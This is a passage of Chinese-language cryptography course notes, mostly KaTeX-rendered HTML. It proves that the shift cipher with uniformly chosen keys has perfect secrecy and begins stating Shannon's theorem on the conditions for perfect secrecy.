style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">c</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">d</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，密钥等概率。</p><p><strong>解：</strong> 计算略，完善保密。因为每一个明文被加密为任何一个密文的概率相等，因此对于每一个密文，其对应的明文为x的概率即为明文出现的概率。</p><h2 id="三-完善保密性相关定理"><a class="markdownIt-Anchor" href="#三-完善保密性相关定理"></a> 三、完善保密性相关定理</h2><p><font color=red>定理1：假设移位密码的26个密钥以相同概率随机使用，对于任意的明文概率分布，移位密码都具有完善保密性。</font></p><p>证明：</p><p>要证明完善保密性，即证明对于任意<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">x\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">y \in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，都有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x|y]=Pr[x]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose">]</span></span></span></span>，其等价于对于任意<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">x\in P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">y \in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，都有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[y|x]=Pr[y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span></span></span></span>。由于明文概率未知，因此<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">x</span><span class="mclose">]</span></span></span></span>无法确定，故证明其等价命题。</p><p>由全概率公式：<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∑</mo><mrow><mi>k</mi><mo>∈</mo><msub><mi>Z</mi><mn>26</mn></msub></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>K</mi><mo>=</mo><mi>k</mi><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>X</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mi>k</mi><mo stretchy="false">)</mo><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mn>26</mn><mo stretchy="false">]</mo><mspace linebreak="newline"></mspace><mo>=</mo><mfrac><mn>1</mn><mn>26</mn></mfrac><msub><mo>∑</mo><mrow><mi>k</mi><mo>∈</mo><msub><mi>Z</mi><mn>26</mn></msub></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>X</mi><mo>=</mo><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mi>k</mi><mo stretchy="false">)</mo><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mn>26</mn><mo stretchy="false">]</mo><mspace linebreak="newline"></mspace><mo>=</mo><mfrac><mn>1</mn><mn>26</mn></mfrac></mrow><annotation encoding="application/x-tex">Pr[y]=\sum_{k\in Z_{26}}Pr[K=k]Pr[X=d_k(y)=(y-k)\mod 26]\\=\frac{1}{26}\sum_{k\in Z_{26}}Pr[X=(y-k)\mod 26]\\=\frac{1}{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.14981em;vertical-align:-0.39981em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.18639799999999995em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.07153em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.39981em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">]</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.244918em;vertical-align:-0.39981em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.18639799999999995em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.07153em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.39981em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">]</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>K</mi><mo>=</mo><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mi>x</mi><mo stretchy="false">)</mo><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mn>26</mn><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mn>26</mn></mfrac></mrow><annotation encoding="application/x-tex">Pr[y|x]=Pr[K=(y-x)\mod 26]=\frac{1}{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>证毕。</p><p><font color=red>定理2：假设密码体制<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>K</mi><mo separator="true">,</mo><mi>E</mi><mo separator="true">,</mo><mi>D</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P,C,K,E,D)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span></span></span></span>满足<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|K|=|C|=|P|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span></span></span></span>（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi><mo>≥</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi><mo>≥</mo><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|K|\ge |C|\ge |P|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span></span></span></span>是完全保密的必要条件）。这个密码体制是完善保密的，当且仅当每个密钥被使用的概率相等，均为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>K</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{|K|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，且对于任意<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">x\in P,y\in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 